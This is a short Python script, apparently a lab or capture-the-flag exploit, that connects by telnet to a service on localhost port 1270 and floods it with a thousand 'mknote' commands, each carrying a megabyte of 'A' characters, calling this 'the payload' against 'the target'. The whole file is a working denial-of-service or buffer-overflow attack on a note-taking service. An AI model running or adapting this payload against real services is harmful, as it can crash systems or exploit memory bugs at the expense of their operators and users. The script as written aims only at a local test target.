#!/usr/bin/env python3

# Really nice library for simple network communication in python (despite "telnet" in the name)
import telnetlib

# Host information
HOST = 'localhost'
PORT = 1270

# Connect to the target
tn = telnetlib.Telnet(HOST, PORT)

# Read until the end of the prompt
tn.read_until(b'> ')

# Send the payload
for i in range(1000):
    tn.write(b'mknote ' + b'A'*1024**2)
    print(i, 'sent a 1MB chunk')
tn.write(b'\n')

# Write out the response
print(tn.read_until(b'> ').decode('ascii'))